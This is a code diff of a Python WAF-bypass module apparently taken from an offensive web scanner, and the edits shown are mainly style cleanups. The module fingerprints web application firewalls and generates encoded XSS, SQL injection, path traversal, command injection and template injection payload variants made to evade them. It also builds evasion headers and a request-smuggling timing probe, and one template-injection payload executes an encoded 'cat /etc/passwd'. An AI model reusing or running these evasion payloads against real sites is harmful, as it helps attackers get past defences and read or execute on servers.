@@ -1,12 +1,13 @@
+import base64
+import binascii
 import json
 import random
-import time
-import base64
 import re
-import binascii
+import time
 from urllib.parse import quote
-from typing import List, Dict
+
 from core.ua import BYPASS_UAS
+
 
 class WAFBypass:
     """Complete WAF bypass engine — detection, encoding, header manipulation."""
@@ -32,7 +33,7 @@ class WAFBypass:
 
 
     @staticmethod
-    def detect_waf(headers: Dict, body: str) -> List[str]:
+    def detect_waf(headers: dict, body: str) -> list[str]:
         """Detect WAF from response headers + body signatures with priority to avoid hallucinations."""
         detected = []
         h = {k.lower(): v.lower() for k, v in headers.items()}
@@ -47,7 +48,7 @@ class WAFBypass:
         if "x-ms-request-id" in h: detected.append("azure_waf")
         if "x-amzn-requestid" in h: detected.append("aws_waf")
         if "x-protected-by" in h and "mod_security" in h["x-protected-by"]: detected.append("modsecurity")
-        if "set-cookie" in h and re.search(r"\bBIGipServer|F5_ST|TS[a-f0-9]{3,}", h["set-cookie"], re.I):
+        if "set-cookie" in h and re.search(r"\bBIGipServer|F5_ST|TS[a-f0-9]{3,}", h["set-cookie"], re.IGNORECASE):
             detected.append("f5_bigip")
         
         # Priority 2: Server Header Keywords
@@ -70,13 +71,14 @@ class WAFBypass:
                         break
         
         # Challenge indicators
-        if "attention required" in b or "just a moment" in b or "checking your browser" in b:
-            if "cloudflare" not in detected: detected.append("cloudflare_challenge")
+        if (("attention required" in b or "just a moment" in b or "checking your browser" in b)
+                and "cloudflare" not in detected):
+            detected.append("cloudflare_challenge")
 
         return sorted(set(detected))
 
     @staticmethod
-    def encode_xss(payload: str) -> List[str]:
+    def encode_xss(payload: str) -> list[str]:
         """9 encoding techniques for XSS WAF bypass."""
         variants = [payload]
         
@@ -116,10 +118,10 @@ class WAFBypass:
         mixed = base64.b64encode(payload.encode()).decode()
         variants.append(f"eval(atob('{mixed}'))")
         
-        return list(set(v for v in variants if v.strip()))
+        return list({v for v in variants if v.strip()})
 
     @staticmethod
-    def encode_sqli(payload: str) -> List[str]:
+    def encode_sqli(payload: str) -> list[str]:
         """11 encoding techniques for SQLi WAF bypass."""
         variants = [payload]
         
@@ -181,10 +183,10 @@ class WAFBypass:
             cv = ",".join(str(ord(c)) for c in q)
             variants.append(payload.replace(f"'{q}'", f"CHAR({cv})"))
         
-        return list(set(v for v in variants if v.strip()))
+        return list({v for v in variants if v.strip()})
 
     @staticmethod
-    def encode_lfi(payload: str) -> List[str]:
+    def encode_lfi(payload: str) -> list[str]:
         """12 LFI path traversal bypass techniques."""
         variants = [payload]
         
@@ -220,7 +222,7 @@ class WAFBypass:
         return list(set(variants))
 
     @staticmethod
-    def encode_rce(payload: str) -> List[str]:
+    def encode_rce(payload: str) -> list[str]:
         """10 RCE/command injection bypass techniques."""
         variants = [payload]
         
@@ -273,7 +275,7 @@ class WAFBypass:
         return list(set(variants))
 
     @staticmethod
-    def encode_ssti(payload: str) -> List[str]:
+    def encode_ssti(payload: str) -> list[str]:
         """SSTI WAF bypass — 25+ variants covering Jinja2, Mako, Twig, ERB, Freemarker, Velocity."""
         variants = [payload]
 
@@ -367,10 +369,10 @@ class WAFBypass:
         b64_cat = _b64.b64encode(b'cat /etc/passwd').decode()
         variants.append(f"{{{{lipsum.__globals__['os'].popen(__import__('base64').b64decode('{b64_cat}').decode()).read()}}}}")
 
-        return list(set(v for v in variants if v.strip()))
+        return list({v for v in variants if v.strip()})
 
     @staticmethod
-    def get_bypass_headers() -> Dict[str, str]:
+    def get_bypass_headers() -> dict[str, str]:
         """Generate WAF-evading request headers."""
         uas = BYPASS_UAS
         
@@ -395,7 +397,7 @@ class WAFBypass:
         }
 
     @staticmethod
-    def h2_smuggle_check(url: str, policy=None) -> Dict:
+    def h2_smuggle_check(url: str, policy=None) -> dict:
         """Conservative request smuggling probe.
         
         This does not prove desync by itself. It only flags repeated timing
@@ -407,7 +409,7 @@ class WAFBypass:
         baseline = thttp(url, timeout=timeout, policy=policy)
         baseline_time = baseline.get("time", 0) or 0
 
-        def timing_anomaly(response: Dict) -> bool:
+        def timing_anomaly(response: dict) -> bool:
             elapsed = response.get("time", 0) or 0
             return response["status"] > 0 and elapsed >= timeout * 0.85 and baseline_time < timeout * 0.5
         
